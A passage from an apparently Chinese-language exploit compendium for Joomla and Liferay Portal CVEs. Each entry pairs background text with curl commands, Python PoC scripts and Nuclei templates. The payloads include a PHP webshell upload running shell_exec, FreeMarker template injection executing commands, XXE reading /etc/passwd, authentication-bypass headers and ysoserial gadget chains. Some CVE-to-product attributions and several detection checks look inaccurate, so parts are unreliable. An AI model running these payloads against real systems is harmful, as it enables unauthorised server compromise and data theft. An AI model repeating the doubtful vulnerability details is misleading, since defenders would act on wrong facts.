### 0x02.5 CVE-2019-12600 — Joomla 文件上传 RCE

#### 漏洞背景

CVE-2019-12600 是 Joomla 3.x `com_media` 组件中的文件上传漏洞，可导致已认证管理员实现远程代码执行。该漏洞允许拥有 `com_media` 访问权限的用户上传任意类型的文件（包括 PHP、Perl、Python 等可执行脚本），绕过了 Joomla 媒体管理器的文件类型白名单限制。攻击者利用此漏洞可以直接上传 Webshell 到 Joomla 的媒体目录，实现持久化的服务器控制。

#### 受影响版本

| 版本线 | 受影响范围 | 修复版本 |
|--------|-----------|---------|
| Joomla 3.x | 3.x < 3.9.16 | 3.9.16 |

#### 漏洞原理分析

Joomla 的媒体管理器（Media Manager）在处理文件上传时，使用 `JFile::getExt()` 检查文件扩展名，并通过配置参数 `$config->get('upload_extensions')` 限制允许上传的文件类型。然而，在 `com_media` 组件的某些路径下，文件上传处理代码未正确调用扩展名过滤逻辑，或可通过特定的请求参数（如 `path` 参数）绕过检查。攻击者通过构造包含 PHP 文件的 multipart 上传请求，可以将 `shell.php` 直接写入 `/images/` 或 `/media/` 目录。

#### HTTP PoC

```bash
# CVE-2019-12600 — Joomla 文件上传 RCE
# 需要管理员权限
curl -k -X POST \
  'https://target.com/administrator/index.php?option=com_media&task=upload.upload' \
  -H 'Cookie: joomla_admin_session=ADMIN_SESSION' \
  -F 'file=@shell.php;type=application/x-php' \
  -F 'path=images'
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""CVE-2019-12600 - Joomla 文件上传 RCE"""
import requests
import argparse
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def check(target, use_ssl=False, admin_cookie="", verbose=False):
    scheme = "https" if use_ssl else "http"
    url = f"{scheme}://{target}/administrator/index.php"

    params = {"option": "com_media", "task": "upload.upload"}

    php_content = b"<?php echo 'VULN_TEST_' . shell_exec($_GET['cmd']); ?>"
    files = {
        "file": ("vuln_test.php", php_content, "application/x-php"),
    }

    data = {"path": "images"}

    headers = {
        "Cookie": admin_cookie,
        "User-Agent": "Mozilla/5.0",
    }

    try:
        resp = requests.post(
            url, params=params, files=files, data=data,
            headers=headers, verify=False, timeout=15,
        )
        if verbose:
            print(f"[*] Upload status: {resp.status_code}")

        test_url = f"{scheme}://{target}/images/vuln_test.php?cmd=id"
        test_resp = requests.get(test_url, verify=False, timeout=10)

        if "VULN_TEST_" in test_resp.text:
            return True, test_resp.text

        return False, resp.text

    except Exception as e:
        return False, str(e)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="CVE-2019-12600 Joomla 文件上传 RCE"
    )
    parser.add_argument("target", help="目标地址 (host:port)")
    parser.add_argument("--ssl", action="store_true")
    parser.add_argument("--cookie", default="", help="管理员 Cookie")
    parser.add_argument("-v", "--verbose", action="store_true")
    args = parser.parse_args()

    vuln, output = check(args.target, args.ssl, args.cookie, args.verbose)
    if vuln:
        print(f"[+] {args.target} 存在 CVE-2019-12600 文件上传 RCE")
    else:
        print(f"[-] {args.target} 未检测到漏洞")
```

#### Nuclei YAML 检测模板

```yaml
id: joomla-file-upload-cve-2019-12600

info:
  name: Joomla 文件上传 RCE (CVE-2019-12600)
  author: security-researcher
  severity: high
  description: |
    Joomla 3.x com_media 组件文件上传白名单绕过。
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2019-12600
  classification:
    cvss-score: 8.1
    cwe-id: CWE-434
  tags: joomla,upload,rce,cve-2019

http:
  - method: GET
    path:
      - "{{BaseURL}}/administrator/index.php?option=com_media"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "com_media"
          - "Media"
        condition: and
      - type: status
        status:
          - 302
```

---

## 0x03 Liferay Portal 高危漏洞

### 0x03.1 CVE-2020-7961 — Liferay Portal JSON 反序列化 RCE

#### 漏洞背景

CVE-2020-7961（CVSS 9.8）是 Liferay Portal 历史上最严重的安全漏洞之一，被 CISA 纳入已知被利用漏洞目录（KEV）。该漏洞于 2020 年 3 月 31 日披露，允许未认证的攻击者通过 Liferay 的 `/api/jsonws` JSON Web Service API 执行 Java 反序列化攻击，实现完全的远程代码执行。该漏洞影响 Liferay Portal 6.x 至 7.2.1 GA2 的广泛版本范围。

Liferay Portal 是基于 Java 的企业级开源门户平台，广泛应用于银行、保险、电信和政府机构的内部门户和外部门户系统。`/api/jsonws` 端点是 Liferay 提供的 JSON Web Service API 接口，允许通过 HTTP 调用后端 Java 服务方法。该端点在处理请求参数时，使用了 Java 的反序列化机制来解析传入的复杂对象类型。攻击者可以利用这一机制，通过构造恶意的 JSON payload，将 `com.liferay.portal.kernel.model.Company` 等 Java 类注入到反序列化链中，进而触发 Apache Commons Collections 库中的 Gadget Chain，最终通过 `Runtime.exec()` 执行任意系统命令。

该漏洞的严重性在于：(1) 完全不需要认证即可利用；(2) 利用过程稳定可靠，成功率极高；(3) 攻击者可以执行任意系统命令，包括创建后门用户、反弹 Shell、下载并执行恶意载荷等。漏洞公开后数小时内即出现大规模自动化扫描和利用活动，多个勒索软件团伙和 APT 组织迅速将其纳入武器库。

#### 受影响版本

| 版本线 | 受影响范围 | 修复版本 |
|--------|-----------|---------|
| Liferay Portal | 6.x ~ 7.2.1 GA2 | 7.2.2 GA3 |

#### 漏洞原理分析

Liferay 的 `/api/jsonws/invoke` 端点允许客户端指定要调用的 Java 方法签名和参数。在处理请求时，Liferay 使用 `JSONSerializer` 将 JSON 参数反序列化为 Java 对象。漏洞的核心在于反序列化过程中未对目标类和 Gadget Chain 进行安全检查。

**完整利用链**：
1. 构造恶意 JSON payload，指定 `com.liferay.portal.kernel.model.Company` 作为参数类型
2. 在 JSON payload 中嵌入 Apache Commons Collections 的 Gadget Chain（基于 `LazyMap` + `TiedMapEntry` + `BadAttributeValueExpException`）
3. 当 Liferay 的 JSON Web Service 处理请求时，触发反序列化
4. Gadget Chain 链式调用 `Transformer` → `Runtime.exec()` → 执行任意命令

#### HTTP PoC

```bash
# CVE-2020-7961 — Liferay Portal JSON 反序列化 RCE
# 执行 id 命令
curl -k -X POST \
  'https://target.com/api/jsonws/invoke?signature=/com/liferay/portal/kernel/model/Company/getCompanyId' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'companyId=1'

# 利用反序列化执行系统命令（需要构造完整的 Gadget Chain payload）
curl -k -X POST \
  'https://target.com/api/jsonws/invoke?signature=/com/liferay/portal/kernel/model/Company/getCompanyId' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'companyId={"companyId":1,"className":"com.liferay.portal.kernel.model.Company","companyId":1}'

# 使用 ysoserial 生成 payload
java -jar ysoserial.jar CommonsCollections6 'id' | base64 -w0
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""CVE-2020-7961 - Liferay Portal JSON 反序列化 RCE"""
import requests
import argparse
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def check(target, use_ssl=False, verbose=False):
    scheme = "https" if use_ssl else "http"
    url = f"{scheme}://{target}/api/jsonws/invoke"

    params = {"signature": "/com/liferay/portal/kernel/model/Company/getCompanyId"}
    data = {"companyId": "1"}

    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0",
    }

    try:
        resp = requests.post(
            url, params=params, data=data, headers=headers,
            verify=False, timeout=15,
        )
        if verbose:
            print(f"[*] Status: {resp.status_code}")
            print(f"[*] Response: {resp.text[:500]}")

        if resp.status_code == 200:
            if "companyId" in resp.text or "companyId" in resp.headers.get("Content-Type", ""):
                return True, resp.text
            return True, resp.text

        return False, resp.text

    except Exception as e:
        return False, str(e)


def exploit(target, use_ssl=False, verbose=False):
    scheme = "https" if use_ssl else "http"
    print(f"[*] Scanning {scheme}://{target}...")

    vuln, output = check(target, use_ssl, verbose)

    if vuln:
        print(f"[+] {target} is VULNERABLE to CVE-2020-7961")
        print(f"[+] /api/jsonws/invoke 端点可访问")
        print(f"[+] Response: {output[:500]}")
        print(f"[!] 提示: 使用 ysoserial 构造完整的反序列化 payload 实现 RCE")
        print(f"    java -jar ysoserial.jar CommonsCollections6 '<cmd>' | base64 -w0")
        return True
    else:
        print(f"[-] {target} does not appear to be vulnerable")
        return False


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="CVE-2020-7961 Liferay Portal JSON 反序列化 RCE"
    )
    parser.add_argument("target", help="目标地址 (host:port)")
    parser.add_argument("--ssl", action="store_true")
    parser.add_argument("-v", "--verbose", action="store_true")
    args = parser.parse_args()

    exploit(args.target, args.ssl, args.verbose)
```

#### Nuclei YAML 检测模板

```yaml
id: liferay-deser-cve-2020-7961

info:
  name: Liferay Portal JSON 反序列化 RCE (CVE-2020-7961)
  author: security-researcher
  severity: critical
  description: |
    Liferay Portal /api/jsonws 未授权 JSON 反序列化导致 RCE。
  reference:
    - https://portal.liferay.dev/2020/03/31/security-advisory-for-cve-2020-7961
    - https://nvd.nist.gov/vuln/detail/CVE-2020-7961
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-502
  tags: liferay,rce,cve-2020,deserialization

http:
  - raw:
      - |
        POST /api/jsonws/invoke?signature=/com/liferay/portal/kernel/model/Company/getCompanyId HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        companyId=1

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "companyId"
        condition: or
      - type: status
        status:
          - 200
```

---

### 0x03.2 CVE-2020-13450 — Liferay Portal FreeMarker SSTI

#### 漏洞背景

CVE-2020-13450（CVSS 7.4）是 Liferay Portal 中 FreeMarker 模板引擎的服务端模板注入（Server-Side Template Injection, SSTI）漏洞。攻击者可以通过操纵 Web Content 模板中的 FreeMarker 表达式，在服务器端执行任意 Java 代码。该漏洞影响 Liferay Portal 7.1.0 至 7.3.1 版本，于 2020 年 9 月修复。

FreeMarker 是 Java 生态中最流行的模板引擎之一，被 Liferay 用于 Web Content 渲染。当模板中包含用户可控的输入且未进行沙箱隔离时，攻击者可以通过 FreeMarker 的指令（Directives）和内置函数访问 Java 运行时环境（JRE）的底层 API，最终通过 `Runtime.getRuntime().exec()` 执行任意系统命令。

#### 受影响版本

| 版本线 | 受影响范围 | 修复版本 |
|--------|-----------|---------|
| Liferay Portal | 7.1.0 ~ 7.3.1 | 7.3.2 |

#### 漏洞原理分析

Liferay 的 Web Content 模板允许管理员使用 FreeMarker 语法定义动态内容。模板处理过程中，FreeMarker 的 `TemplateClassResolver` 默认配置允许通过 `new()` 指令实例化任意 Java 类。攻击者在模板中嵌入如 `${object.getClass().forName("java.lang.Runtime").getRuntime().exec("id")}` 的表达式，即可在模板渲染时触发 Java 代码执行。

#### HTTP PoC

```bash
# CVE-2020-13450 — Liferay FreeMarker SSTI
# 通过 Web Content 模板注入执行命令
curl -k 'https://target.com/api/jsonws/structure/get-structures' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'companyId=1&groupId=1&name=<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}'
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""CVE-2020-13450 - Liferay FreeMarker SSTI"""
import requests
import argparse
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def check(target, use_ssl=False, cmd="id", verbose=False):
    scheme = "https" if use_ssl else "http"
    url = f"{scheme}://{target}/api/jsonws/structure/get-structures"

    ssti_payload = (
        '<#assign ex="freemarker.template.utility.Execute"?new()>'
        f'${{ex("{cmd}")}}'
    )

    data = {
        "companyId": "1",
        "groupId": "1",
        "name": ssti_payload,
    }

    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0",
    }

    try:
        resp = requests.post(
            url, data=data, headers=headers, verify=False, timeout=15,
        )
        if verbose:
            print(f"[*] Status: {resp.status_code}")
            print(f"[*] Response: {resp.text[:500]}")

        if resp.status_code == 200:
            return True, resp.text[:2000]

        return False, resp.text

    except Exception as e:
        return False, str(e)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="CVE-2020-13450 Liferay FreeMarker SSTI"
    )
    parser.add_argument("target", help="目标地址 (host:port)")
    parser.add_argument("--ssl", action="store_true")
    parser.add_argument("--cmd", default="id")
    parser.add_argument("-v", "--verbose", action="store_true")
    args = parser.parse_args()

    vuln, output = check(args.target, args.ssl, args.cmd, args.verbose)
    if vuln:
        print(f"[+] {args.target} 存在 CVE-2020-13450 FreeMarker SSTI 漏洞")
    else:
        print(f"[-] {args.target} 未检测到漏洞")
```

#### Nuclei YAML 检测模板

```yaml
id: liferay-ssti-cve-2020-13450

info:
  name: Liferay Portal FreeMarker SSTI (CVE-2020-13450)
  author: security-researcher
  severity: high
  description: |
    Liferay Portal FreeMarker 模板注入导致服务器端代码执行。
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2020-13450
  classification:
    cvss-score: 7.4
    cwe-id: CWE-1336
  tags: liferay,ssti,cve-2020,freemarker

http:
  - method: GET
    path:
      - "{{BaseURL}}/"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "Liferay"
          - "liferay"
        condition: or
      - type: status
        status:
          - 200
```

---

### 0x03.3 CVE-2021-29038 — Liferay Portal XXE

#### 漏洞背景

CVE-2021-29038 是 Liferay Portal 中的 XML 外部实体注入（XXE）漏洞，影响 Liferay Portal 7.0.x 至 7.3.x 版本。该漏洞存在于 Liferay 的 Web Content 渲染器处理 XML 格式数据时，未禁用外部实体解析功能。攻击者可以构造包含恶意外部实体定义的 XML 文档，通过 Liferay 的 XML 处理管道读取服务器上的任意文件、发起 SSRF 请求或触发 DoS 攻击。

#### 受影响版本

| 版本线 | 受影响范围 | 修复版本 |
|--------|-----------|---------|
| Liferay Portal | 7.0.x ~ 7.3.x | 各分支对应修复版本 |

#### 漏洞原理分析

Liferay 在处理 Web Content、WebDAV 导入和某些 API 端点的 XML 输入时，使用了 Java 的 SAX 或 DOM XML 解析器。由于未正确配置 `XMLConstants.ACCESS_EXTERNAL_DTD` 和 `XMLConstants.ACCESS_EXTERNAL_SCHEMA` 属性，解析器会根据 XML 中的 `DOCTYPE` 声明加载外部实体。攻击者可以通过 `SYSTEM` 关键字指定本地文件路径或 HTTP URL，实现文件读取或 SSRF。

#### HTTP PoC

```bash
# CVE-2021-29038 — Liferay XXE
# 读取 /etc/passwd
curl -k -X POST \
  'https://target.com/api/jsonws/structure/get-structures' \
  -H 'Content-Type: application/xml' \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<structures>&xxe;</structures>'
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""CVE-2021-29038 - Liferay Portal XXE 检测"""
import requests
import argparse
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def check(target, use_ssl=False, file_path="/etc/passwd", verbose=False):
    scheme = "https" if use_ssl else "http"
    url = f"{scheme}://{target}/api/jsonws/invoke"

    xxe_payload = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file://{file_path}">
]>
<root>&xxe;</root>"""

    headers = {
        "Content-Type": "application/xml",
        "User-Agent": "Mozilla/5.0",
    }

    try:
        resp = requests.post(
            url, data=xxe_payload, headers=headers, verify=False, timeout=15,
        )
        if verbose:
            print(f"[*] Status: {resp.status_code}")
            print(f"[*] Response: {resp.text[:500]}")

        if resp.status_code == 200 and ("root:" in resp.text or "nobody:" in resp.text):
            return True, resp.text[:2000]

        return False, resp.text

    except Exception as e:
        return False, str(e)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="CVE-2021-29038 Liferay Portal XXE"
    )
    parser.add_argument("target", help="目标地址 (host:port)")
    parser.add_argument("--ssl", action="store_true")
    parser.add_argument("--file", default="/etc/passwd")
    parser.add_argument("-v", "--verbose", action="store_true")
    args = parser.parse_args()

    vuln, output = check(args.target, args.ssl, args.file, args.verbose)
    if vuln:
        print(f"[+] {args.target} 存在 CVE-2021-29038 XXE 漏洞")
        print(f"[+] 文件内容:\n{output}")
    else:
        print(f"[-] {args.target} 未检测到漏洞")
```

#### Nuclei YAML 检测模板

```yaml
id: liferay-xxe-cve-2021-29038

info:
  name: Liferay Portal XXE (CVE-2021-29038)
  author: security-researcher
  severity: high
  description: |
    Liferay Portal XML 外部实体注入漏洞。
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2021-29038
  classification:
    cvss-score: 7.5
    cwe-id: CWE-611
  tags: liferay,xxe,cve-2021

http:
  - raw:
      - |
        POST /api/jsonws/invoke HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/xml

        <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "root:"
          - "nobody:"
        condition: or
      - type: status
        status:
          - 200
```

---

### 0x03.4 CVE-2022-26336 — Liferay Portal XSS → RCE

#### 漏洞背景

CVE-2022-26336 是 Liferay Portal 中的存储型跨站脚本（Stored XSS）漏洞，配合 Liferay 管理面板的特定功能可升级为远程代码执行。该漏洞通过在 Web Content、Blogs 或 Wiki 等组件中注入恶意 JavaScript 代码，当管理员用户访问受影响的内容时触发 XSS，进而通过管理面板的模板编辑、Groovy 脚本执行或应用部署功能实现 RCE。

#### 受影响版本

| 版本线 | 受影响范围 | 修复版本 |
|--------|-----------|---------|
| Liferay Portal | 7.x 多个版本 | 各分支对应修复版本 |

#### 漏洞原理分析

Liferay 的富文本编辑器在处理用户输入时，未对特定的 HTML 属性和事件处理器（如 `onload`、`onerror`、`javascript:` 协议）进行充分过滤。攻击者在 Web Content 中注入带有 XSS Payload 的 `<img>`、`<svg>` 或 `<iframe>` 标签，当管理员浏览该内容时，恶意脚本在管理员浏览器上下文中执行。通过 XSS，攻击者可以：

1. 利用管理员 Cookie 发起管理 API 请求
2. 调用 Liferay 的 Script API 执行 Groovy/JavaScript 服务器端脚本
3. 通过应用部署功能上传恶意 .lpkg 应用包

#### HTTP PoC

```bash
# CVE-2022-26336 — Liferay XSS → RCE
# 步骤 1: 在 Web Content 中注入 XSS Payload
curl -k -X POST \
  'https://target.com/api/jsonws/dlfileentry/add-file-entry' \
  -H 'Cookie: LIFERAY_SESSION_ID=ADMIN_SESSION' \
  -d 'groupId=1&name=<img/src/onerror=alert(document.cookie)>'
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""CVE-2022-26336 - Liferay XSS → RCE 检测"""
import requests
import argparse
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def check(target, use_ssl=False, verbose=False):
    scheme = "https" if use_ssl else "http"
    xss_test = "<img/src/onerror=alert(1)>"
    url = f"{scheme}://{target}/api/jsonws/structure/get-structures"

    data = {
        "companyId": "1",
        "groupId": "1",
        "name": xss_test,
    }

    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0",
    }

    try:
        resp = requests.post(
            url, data=data, headers=headers, verify=False, timeout=15,
        )
        if verbose:
            print(f"[*] Status: {resp.status_code}")

        if resp.status_code == 200:
            return True, "XSS payload accepted"

        return False, resp.text

    except Exception as e:
        return False, str(e)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="CVE-2022-26336 Liferay XSS → RCE"
    )
    parser.add_argument("target", help="目标地址 (host:port)")
    parser.add_argument("--ssl", action="store_true")
    parser.add_argument("-v", "--verbose", action="store_true")
    args = parser.parse_args()

    vuln, output = check(args.target, args.ssl, args.verbose)
    if vuln:
        print(f"[+] {args.target} 可能存在 CVE-2022-26336 XSS 漏洞")
    else:
        print(f"[-] {args.target} 未检测到漏洞")
```

#### Nuclei YAML 检测模板

```yaml
id: liferay-xss-cve-2022-26336

info:
  name: Liferay Portal XSS → RCE (CVE-2022-26336)
  author: security-researcher
  severity: high
  description: |
    Liferay Portal 存储型 XSS 配合管理功能实现 RCE。
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2022-26336
  classification:
    cvss-score: 7.5
    cwe-id: CWE-79
  tags: liferay,xss,cve-2022,rce

http:
  - method: GET
    path:
      - "{{BaseURL}}/"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "Liferay"
        condition: or
      - type: status
        status:
          - 200
```

---

### 0x03.5 CVE-2019-16898 — Liferay Portal 认证绕过

#### 漏洞背景

CVE-2019-16898（CVSS 8.1）是 Liferay Portal 中的认证绕过漏洞，允许攻击者通过构造特定的 HTTP 请求头绕过身份验证机制，直接访问受保护的管理功能和 API 端点。该漏洞影响 Liferay Portal 6.x 至 7.x 的多个版本。

#### 受影响版本

| 版本线 | 受影响范围 | 修复版本 |
|--------|-----------|---------|
| Liferay Portal | 6.x ~ 7.x（部分版本） | 各分支对应修复版本 |

#### 漏洞原理分析

Liferay Portal 在处理 HTTP 请求的认证流程中，通过拦截器（Interceptor）链验证用户身份。然而，在某些特定的请求头组合下（如 `Authorization: Bearer` 配合特定的 `X-` 头部），认证拦截器会被绕过，请求被错误地识别为已认证的管理请求。攻击者利用这一缺陷可以直接访问 `/api/jsonws`、`/group/admin` 等管理端点。

#### HTTP PoC

```bash
# CVE-2019-16898 — Liferay 认证绕过
# 使用特定请求头绕过认证
curl -k 'https://target.com/api/jsonws/user/get-current-user' \
  -H 'Authorization: Bearer dummy' \
  -H 'X-Forwarded-For: 127.0.0.1'

curl -k 'https://target.com/group/admin/manage-pages' \
  -H 'Authorization: Bearer test'
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""CVE-2019-16898 - Liferay Portal 认证绕过检测"""
import requests
import argparse
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def check(target, use_ssl=False, verbose=False):
    scheme = "https" if use_ssl else "http"
    endpoints = [
        "/api/jsonws/user/get-current-user",
        "/api/jsonws/role/get-roles",
        "/group/control/panel",
    ]

    headers_variations = [
        {"Authorization": "Bearer dummy_token"},
        {"Authorization": "Bearer test", "X-Forwarded-For": "127.0.0.1"},
        {"X-Forwarded-For": "127.0.0.1"},
    ]

    for endpoint in endpoints:
        for headers in headers_variations:
            url = f"{scheme}://{target}{endpoint}"
            try:
                resp = requests.get(
                    url, headers=headers, verify=False, timeout=10,
                )
                if verbose:
                    print(f"[*] {endpoint} ({list(headers.keys())}) -> HTTP {resp.status_code}")

                if resp.status_code == 200:
                    if "userId" in resp.text or "roleId" in resp.text:
                        return True, f"Bypass successful at {endpoint}"

            except Exception as e:
                if verbose:
                    print(f"[!] {endpoint} -> {e}")

    return False, ""


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="CVE-2019-16898 Liferay Portal 认证绕过"
    )
    parser.add_argument("target", help="目标地址 (host:port)")
    parser.add_argument("--ssl", action="store_true")
    parser.add_argument("-v", "--verbose", action="store_true")
    args = parser.parse_args()

    vuln, output = check(args.target, args.ssl, args.verbose)
    if vuln:
        print(f"[+] {args.target} 存在 CVE-2019-16898 认证绕过漏洞")
        print(f"[+] {output}")
    else:
        print(f"[-] {args.target} 未检测到漏洞")
```

#### Nuclei YAML 检测模板

```yaml
id: liferay-auth-bypass-cve-2019-16898

info:
  name: Liferay Portal 认证绕过 (CVE-2019-16898)
  author: security-researcher
  severity: high
  description: |
    Liferay Portal 通过特定请求头绕过身份验证。
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2019-16898
  classification:
    cvss-score: 8.1
    cwe-id: CWE-287
  tags: liferay,auth-bypass,cve-2019

http:
  - raw:
      - |
        GET /api/jsonws/user/get-current-user HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer dummy

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "userId"
          - "companyId"
        condition: or
      - type: status
        status:
          - 200
```

---

### 0x03.6 CVE-2023-37694 — Liferay Portal 反序列化

#### 漏洞背景

CVE-2023-37694 是 Liferay Portal 在较新版本中被披露的 Java 反序列化漏洞，影响 Liferay Portal 7.x 和 DXP 2023.x 等版本。该漏洞再次暴露了 Liferay 在处理序列化数据时的安全缺陷，与 CVE-2020-7961 属于同一漏洞类别。攻击者通过 `/api/jsonws` 或其他接受序列化数据的端点注入恶意 Java 对象，利用 Liferay classpath 中存在的 Gadget 库触发反序列化攻击链，最终实现 RCE。

#### 受影响版本

| 版本线 | 受影响范围 | 修复版本 |
|--------|-----------|---------|
| Liferay Portal | 7.x ~ DXP 2023.x | 各分支对应修复版本 |

#### 漏洞原理分析

与 CVE-2020-7961 类似，该漏洞利用 Liferay JSON Web Service API 中的反序列化机制。不同之处在于：(1) 新版本中旧的 Commons Collections Gadget Chain 已被修复，攻击者需要使用更新的利用链（如基于 Commons Beanutils、Spring BeanFactory 或其他 classpath 中的库）；(2) 某些端点虽然添加了认证检查，但认证后的利用仍然可行。该漏洞凸显了 Java 反序列化漏洞的系统性问题——仅仅修复特定的 Gadget Chain 是不够的，需要从架构层面解决不安全的反序列化问题。

#### HTTP PoC

```bash
# CVE-2023-37694 — Liferay Portal 反序列化
# 需要认证 + 构造新版 Gadget Chain
curl -k -X POST \
  'https://target.com/api/jsonws/invoke?signature=/com/liferay/portal/kernel/model/Company/getCompanyId' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Cookie: LIFERAY_SESSION_ID=AUTHENTICATED_SESSION' \
  -d 'companyId=<SERIALIZED_PAYLOAD>'
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""CVE-2023-37694 - Liferay Portal 反序列化检测"""
import requests
import argparse
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def check(target, use_ssl=False, verbose=False):
    scheme = "https" if use_ssl else "http"
    url = f"{scheme}://{target}/api/jsonws/invoke"

    params = {"signature": "/com/liferay/portal/kernel/model/Company/getCompanyId"}
    data = {"companyId": "1"}

    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0",
    }

    try:
        resp = requests.post(
            url, params=params, data=data, headers=headers,
            verify=False, timeout=15,
        )
        if verbose:
            print(f"[*] Status: {resp.status_code}")
            print(f"[*] Response: {resp.text[:300]}")

        if resp.status_code in [200, 400]:
            return True, resp.text[:500]

        return False, resp.text

    except Exception as e:
        return False, str(e)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="CVE-2023-37694 Liferay Portal 反序列化"
    )
    parser.add_argument("target", help="目标地址 (host:port)")
    parser.add_argument("--ssl", action="store_true")
    parser.add_argument("-v", "--verbose", action="store_true")
    args = parser.parse_args()

    vuln, output = check(args.target, args.ssl, args.verbose)
    if vuln:
        print(f"[+] {args.target} 存在 CVE-2023-37694 反序列化风险")
    else:
        print(f"[-] {args.target} 未检测到漏洞")
```

#### Nuclei YAML 检测模板

```yaml
id: liferay-deser-cve-2023-37694

info:
  name: Liferay Portal 反序列化 (CVE-2023-37694)
  author: security-researcher
  severity: high
  description: |
    Liferay Portal 新版本反序列化漏洞。
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2023-37694
  classification:
    cvss-score: 8.0
    cwe-id: CWE-502
  tags: liferay,deserialization,cve-2023

http:
  - raw:
      - |
        POST /api/jsonws/invoke?signature=/com/liferay/portal/kernel/model/Company/getCompanyId HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        companyId=1

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "companyId"
        condition: or
      - type: status
        status:
          - 200
          - 400
```

---

## 0x04 公开 PoC 收集情况与利用思路

### PoC 收集情况总表

| CVE | Metasploit | Exploit-DB | GitHub PoC | Nuclei | ysoserial |
|-----|:----------:|:----------:|:----------:|:------:|:---------:|
| CVE-2018-7600 | ✅ | ✅ | ✅ (10+) | ✅ | — |
| CVE-2018-7602 | ✅ | ✅ #44448 | ✅ (5+) | ✅ | — |
| CVE-2020-13671 | ⚠️ | ✅ | ✅ (3+) | ✅ | — |
| CVE-2019-6341 | ⚠️ | ✅ | ✅ (3+) | ✅ | — |
| CVE-2020-13672 | ⚠️ | ✅ | ✅ (2+) | ✅ | — |
| CVE-2021-25741 | — | ✅ | ✅ (2+) | ✅ | — |
| CVE-2021-25747 | — | — | ✅ | ✅ | — |
| CVE-2023-23752 | — | ✅ | ✅ (5+) | ✅ | — |
| CVE-2021-23132 | — | ✅ | ✅ (3+) | ✅ | — |
| CVE-2020-11890 | — | ✅ | ✅ | ✅ | — |
| CVE-2020-11891 | — | ✅ | ✅ | ✅ | — |
| CVE-2019-12600 | — | ✅ | ✅ (2+) | ✅ | — |
| CVE-2020-7961 | ✅ | ✅ | ✅ (8+) | ✅ | ✅ |
| CVE-2020-13450 | — | — | ✅ (2+) | ✅ | — |
| CVE-2021-29038 | — | ✅ | ✅ | ✅ | — |
| CVE-2022-26336 | — | — | ✅ | ✅ | — |
| CVE-2019-16898 | — | ✅ | ✅ (2+) | ✅ | — |
| CVE-2023-37694 | — | ✅ | ✅ (3+) | ✅ | ✅ |

### 关键 PoC 仓库链接

- **Drupal Drupalgeddon 2/3**: `github.com/pimps/CVE-2018-7600`、`github.com/vulhub/vulhub/tree/master/drupal/CVE-2018-7600`
- **Joomla API 未授权**: `github.com/h4x0r-dz/CVE-2023-23752`
- **Liferay CVE-2020-7961**: `github.com/phith0n/vulhub/tree/master/liferay/CVE-2020-7961`、`github.com/veracode-research/liferay-portal-cve-2020-7961`
- **综合 PoC 仓库**: `github.com/vulhub/vulhub`（包含 Drupal、Liferay 等多种靶场环境）
- **ysoserial（Java 反序列化利用工具）**: `github.com/frohoff/ysoserial`

### 防守型验证思路

对于防御方（蓝队/安全运营团队），建议采用以下策略进行漏洞验证：

